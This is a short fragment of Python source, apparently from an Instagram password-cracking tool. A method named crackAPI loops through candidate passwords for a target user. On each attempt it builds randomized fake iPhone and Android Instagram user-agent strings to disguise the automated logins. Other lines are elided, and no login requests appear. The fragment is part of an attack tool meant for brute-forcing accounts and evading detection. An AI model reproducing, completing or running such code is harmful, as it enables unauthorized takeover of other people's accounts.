    ...
    def crackAPI(self,user,pas):
        ...
        try:
            for pw in pas:
                ...
                uafake=f"Instagram (iPhone; CPU {str(rr(4,12))}; Mac OS X)  {str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.5.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"
                uafake=f"Instagram (iPhone; CPU iPhone {str(rr(4,12))}; Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone7,2; iOS 11_2_6; pt_PT; pt-PT; scale=2.34; gamut=normal; 750x1331)"
                uafake=f"Instagram (iPhone; CPU {str(rr(4,12))}; XR 12) {str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36"
                uafake=f"Instagram (Linux; Android {str(rr(4,12))}; RMX1851 {str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36"
                uafake=f"Instagram (Linux; Android {str(rr(4,12))}; M2004J19C {str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
                uafake=f"Instagram (Linux; Android {str(rr(4,12))}; FCG01 {str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36"
